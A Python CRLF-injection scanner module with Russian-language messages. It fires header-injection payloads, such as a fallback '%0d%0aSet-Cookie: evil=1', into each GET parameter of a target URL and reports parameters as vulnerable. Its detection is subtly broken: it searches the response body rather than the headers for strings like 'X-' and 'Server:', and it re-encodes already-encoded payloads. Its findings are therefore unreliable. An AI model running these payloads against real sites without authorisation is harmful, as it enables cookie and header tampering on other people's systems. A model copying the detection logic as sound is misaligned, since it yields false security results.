#!/usr/bin/env python3
# crlf_injection.py - CRLF Injection Scanner

import re
import requests
import urllib.parse
from typing import Dict, Any, List

PAYLOAD_FILE = "assets/payloads/CRLF Injection.txt"
TIMEOUT = 10

HEADER_PATTERNS = [
    "Set-Cookie:", "Location:", "Content-Type:", 
    "X-", "Cache-Control:", "Server:", "Cookie:"
]

def load_payloads() -> List[str]:
    try:
        with open(PAYLOAD_FILE, "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        return ["%0d%0aSet-Cookie: evil=1"]

def detect_header_injection(response_text: str) -> bool:
    # Проверяем, появились ли новые заголовки в ответе
    for pattern in HEADER_PATTERNS:
        if pattern in response_text:
            return True
    return False

def run(target: str, **kwargs) -> Dict[str, Any]:
    results = {
        "status": "ok",
        "result": {},
        "errors": [],
        "duration": 0
    }
    
    try:
        payloads = load_payloads()
        parsed = urllib.parse.urlparse(target)
        params = urllib.parse.parse_qs(parsed.query)
        
        if not params:
            results["result"]["message"] = "Нет GET-параметров для проверки"
            results["result"]["vulnerable"] = []
            return results
        
        vulnerable = []
        for param in params:
            for payload in payloads[:30]:
                new_params = {k: v[0] if k != param else payload for k, v in params.items()}
                new_query = urllib.parse.urlencode(new_params)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
                
                try:
                    resp = requests.get(test_url, timeout=TIMEOUT)
                    if detect_header_injection(resp.text):
                        vulnerable.append({
                            "param": param,
                            "payload": payload,
                            "type": "CRLF Injection"
                        })
                        break
                except Exception as e:
                    results["errors"].append(f"Ошибка для {test_url}: {str(e)}")
        
        results["result"]["vulnerable"] = vulnerable
        results["result"]["count"] = len(vulnerable)
        
        if not vulnerable:
            results["result"]["message"] = "CRLF инъекции не найдены"
        
    except Exception as e:
        results["status"] = "error"
        results["errors"].append(str(e))
    
    return results